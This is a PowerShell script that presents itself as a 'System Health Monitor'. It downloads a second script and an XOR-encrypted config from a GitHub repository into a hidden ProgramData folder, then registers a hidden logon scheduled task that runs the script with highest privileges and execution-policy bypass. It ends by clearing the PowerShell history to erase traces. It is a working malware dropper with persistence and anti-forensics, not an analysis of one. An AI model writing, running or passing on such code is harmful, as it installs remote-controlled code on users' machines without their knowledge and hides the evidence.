$ErrorActionPreference="Stop"
$p="C:\ProgramData\SystemHealthService";$u="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitor.ps1";$c="https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/config.enc";$k="S3cr3tK3y2024!";$t="SystemHealthMonitor"
if(!(Test-Path $p)){$null=New-Item -ItemType Directory -Path $p -Force};attrib +h $p 2>$null
$w=New-Object System.Net.WebClient;$w.Headers.Add("User-Agent","PowerShell")
[System.IO.File]::WriteAllText("$p\HealthMonitor.ps1",$w.DownloadString($u));attrib +h "$p\HealthMonitor.ps1" 2>$null
$e=[Convert]::FromBase64String($w.DownloadString($c));$kb=[System.Text.Encoding]::UTF8.GetBytes($k);$d=New-Object byte[] $e.Length;for($i=0;$i -lt $e.Length;$i++){$d[$i]=$e[$i] -bxor $kb[$i % $kb.Length]};[System.IO.File]::WriteAllBytes("$p\config.json",$d);attrib +h "$p\config.json" 2>$null
try{$null=schtasks /delete /tn $t /f 2>&1}catch{};try{Unregister-ScheduledTask -TaskName $t -Confirm:$false -EA SilentlyContinue}catch{}
$a=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-W Hidden -NoP -EP Bypass -File `"$p\HealthMonitor.ps1`"";$tr=New-ScheduledTaskTrigger -AtLogon;$pr=New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -LogonType Interactive -RunLevel Highest;$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 0);Register-ScheduledTask -TaskName $t -Action $a -Trigger $tr -Principal $pr -Settings $s -Force|Out-Null
Start-ScheduledTask -TaskName $t
Clear-History -EA SilentlyContinue;Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -EA SilentlyContinue;exit
